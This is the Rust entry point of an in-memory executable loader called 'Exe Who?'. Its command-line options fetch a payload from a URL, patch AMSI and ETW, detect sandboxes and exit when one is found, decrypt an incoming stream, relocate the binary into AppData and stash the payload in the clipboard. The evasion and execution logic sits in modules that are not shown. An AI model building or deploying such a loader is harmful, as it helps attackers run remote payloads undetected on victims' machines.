mod user_struct;
mod patcher;
mod misc;
mod sandbox;
use std::process::exit;
use crate::user_struct::*;
use clap::{Arg, Command, ArgAction};

fn main() {
    let matches = Command::new("Exe Who?")
        .version("0.1.1")
        .author("DB <whokilleddb@proton.me>")
        .about("Run executables in Memory!")
        .arg(
            Arg::new("url")
                .short('u')
                .long("url")
                .help("URL to fetch executable from")
                .required(true)
        )
        .arg(
            Arg::new("patch_amsi")
                .long("pa")
                .help("Patch AMSI")
                .action(ArgAction::SetTrue)
        )
        .arg(
            Arg::new("patch_etw")
                .long("pe")
                .help("Patch ETW")
                .action(ArgAction::SetTrue)
        )
        .arg(
            Arg::new("detect_sandbox")
                .short('d')
                .long("ds")
                .help("Try to detect if loader is in a Sandbox")
                .action(ArgAction::SetTrue)
        )
        .arg(
            Arg::new("dec_key")
                .short('k')
                .long("key")
                .help("Key for decrypting incoming stream(if encrypted)")
        )
        .arg(
            Arg::new("move")
                .short('m')
                .long("move")
                .help("Move binary to another location")
                .num_args(0..=1)
                .default_missing_value("%USERPROFILE%\\AppData")
        )
        .arg(
            Arg::new("use_clipboard")
                .short('c')
                .long("clipboard")
                .help("[Exp] Store payload in clipboard buffer")
                .action(ArgAction::SetTrue)
        )
        .get_matches();

    let loader_options = match LoaderOptions::new(matches){
        Ok(opts) => opts,
        Err(e) => {
            eprintln!("[!] Error occured as: {}", e);
            exit(-1);
        }
    };

    // Print command line arguments
    println!("{}", loader_options);
    

    patcher::patcher(&loader_options);
    if loader_options.detect_sandbox {
        println!("[i] Detecting Sandbox\n");
        if sandbox::is_sandbox() {
            eprintln!("[!] Possibly in a Sandbox'd environment");
            eprintln!("[!] Exiting!!");
            exit(-2);
        }
    }    
}
